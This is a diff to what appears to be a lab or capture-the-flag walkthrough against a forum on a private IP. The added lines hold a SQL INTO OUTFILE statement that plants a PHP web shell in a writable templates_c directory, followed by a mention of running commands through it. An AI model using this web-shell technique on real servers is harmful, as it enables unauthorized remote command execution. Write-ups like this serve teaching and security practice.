@@ -163,7 +163,16 @@ GENERATED WORDS: 4612
 ==> DIRECTORY: https://192.168.1.19/forum/update/
 ```
 
-Every one of them are protected except for **templates_c**: <br>![](./img/sql-success.png)
+Every one of them are protected except for **templates_c**: 
+
+```bash
+SELECT "<form action='/forum/templates_c/hackedyou.php' method='GET'>Hacked you:
+<input type='text' name='hackedyou'>
+<input type=submit value='exe command'<br><br>
+<?php system($_REQUEST['hackedyou'];?>" INTO OUTFILE "/var/www/forum/templates_c/hackedyou.php"
+```
+
+<br>![](./img/sql-success.png)
 
 We can now inject command in request parameter (`whoami`): <br>![](./img/backdoor-success.png)
 
